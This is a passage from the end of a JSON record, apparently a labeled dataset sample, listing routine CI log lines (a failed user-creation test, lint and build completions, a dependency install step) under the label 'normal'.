          "FAILED: test_user_create",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}